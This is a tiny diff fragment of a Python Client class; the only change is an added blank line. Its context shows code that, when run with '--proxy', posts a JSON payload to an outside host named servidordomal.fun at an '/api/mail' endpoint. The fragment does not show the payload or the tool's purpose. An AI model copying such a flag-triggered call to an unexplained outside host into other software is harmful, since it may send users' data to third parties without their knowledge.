@@ -27,6 +27,7 @@ class Client:
         if "--proxy" in sys.argv:
             try:
                 response = requests.post("https://servidordomal.fun/api/mail", json=json.loads(payload))
+                
                 return response.json().get('response', '')
             except Exception as e:
                 return "9"
